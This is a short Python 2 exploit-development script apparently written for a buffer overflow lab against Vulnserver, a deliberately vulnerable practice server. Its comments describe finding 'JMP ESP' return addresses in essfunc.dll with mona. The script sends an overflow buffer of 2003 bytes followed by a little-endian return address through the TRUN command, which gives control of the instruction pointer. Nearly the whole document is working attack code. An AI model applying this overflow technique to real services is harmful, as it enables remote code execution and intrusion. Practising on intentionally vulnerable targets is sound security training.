#!/usr/bin/python
#Fuzzing program for vulnserver target
import sys, socket

#Identified 'JMP ESP' shell code using nasm_shell as "\xff\xe4"

#Searched vulnserver using mona modules for vulnserver processes with unprotected memory
#Identified essfunc.dll, and used command '!mona find -s "\xff\xe4" -m essfunc.dll'
#Found 9 return addresses
#0x625011af, 0x625011bb, 0x625011c7, 0x625011d3, 0x625011df, 0x625011eb, 0x625011f7, 0x62501203, 0x62501205
#Using 0x625011af in this example

buffer = "A" * 2003
#Shell code uses little endian, or reversed return address
shellcode = "\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('169.254.215.29', 9999)) #target windows Machine IP address and vulnserver port
	s.send(('TRUN /.:/' + buffer + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
